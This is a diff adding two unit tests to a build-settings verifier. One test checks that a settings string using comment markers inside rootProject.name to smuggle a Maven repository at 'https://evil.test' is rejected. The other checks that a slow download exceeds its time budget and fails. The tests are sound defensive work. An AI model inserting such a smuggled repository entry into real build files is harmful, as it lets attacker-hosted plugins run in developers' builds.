@@ -121,6 +121,29 @@ class VerificationTests(unittest.TestCase):
             with self.subTest(text=text), self.assertRaises(ValueError):
                 verifier.validate_settings(text)
 
+    def test_comment_markers_inside_strings_cannot_hide_repository_changes(self):
+        injected = verifier.EXPECTED_SETTINGS.replace(
+            'rootProject.name = "Aergis"',
+            'rootProject.name = "Aergis/*"; pluginManagement.repositories.maven { url = uri("https://evil.test") }; // */"')
+        with self.assertRaises(ValueError):
+            verifier.validate_settings(injected)
+
+    def test_slow_progress_cannot_make_a_download_exceed_its_budget(self):
+        clock = [0.0]
+        class SlowResponse(io.BytesIO):
+            headers = {}
+            def read1(self, size):
+                clock[0] += 121
+                return super().read(size)
+        class Opener:
+            def open(self, request, timeout):
+                return SlowResponse(BODY)
+        with patch.object(verifier.urllib.request, 'build_opener', return_value=Opener()), \
+                patch.object(verifier.time, 'monotonic', side_effect=lambda: clock[0]), \
+                patch.object(verifier.time, 'sleep'):
+            with self.assertRaises(OSError):
+                verifier.download_hash(verifier.REPOSITORIES[0] + 'x.jar')
+
 
 if __name__ == '__main__':
     unittest.main()
